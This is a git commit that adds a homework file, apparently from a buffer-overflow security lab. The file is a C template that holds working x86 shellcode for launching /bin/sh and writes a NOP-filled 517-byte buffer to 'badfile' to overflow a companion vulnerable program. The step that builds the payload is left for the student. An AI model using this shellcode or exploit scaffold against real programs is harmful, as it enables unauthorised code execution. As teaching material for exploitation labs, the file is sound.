07c09a13938c52cde10db083cf80160319c4a792
Stephen <stephenfsu@users.noreply.github.com>
2020-10-08 21:03:33 -0500

    Add files via upload
    Required files for HW 1

---
+++ student-code.c
@@ -0,0 +1,39 @@
+/* student_code.c  */
+
+/* A program that creates a file containing code for launching shell*/
+/* Student needs to supply the code here for creating the file */
+/* When stack.c is used with this file the bufferoverflow should be triggered */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+char shellcode[]=
+    "\x31\xc0"             /* xorl    %eax,%eax              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x68""//sh"           /* pushl   $0x68732f2f            */
+    "\x68""/bin"           /* pushl   $0x6e69622f            */
+    "\x89\xe3"             /* movl    %esp,%ebx              */
+    "\x50"                 /* pushl   %eax                   */
+    "\x53"                 /* pushl   %ebx                   */
+    "\x89\xe1"             /* movl    %esp,%ecx              */
+    "\x99"                 /* cdq                            */
+    "\xb0\x0b"             /* movb    $0x0b,%al              */
+    "\xcd\x80"             /* int     $0x80                  */
+;
+
+void main(int argc, char **argv)
+{
+    char buffer[517];
+    FILE *badfile;
+
+    /* Initialize buffer with 0x90 (NOP instruction) */
+    memset(&buffer, 0x90, 517);
+
+    /* You need to fill the buffer with appropriate contents here */ 
+
+    /* Save the contents to the file "badfile" */
+    badfile = fopen("./badfile", "w");
+    fwrite(buffer, 517, 1, badfile);
+    fclose(badfile);
+}
+
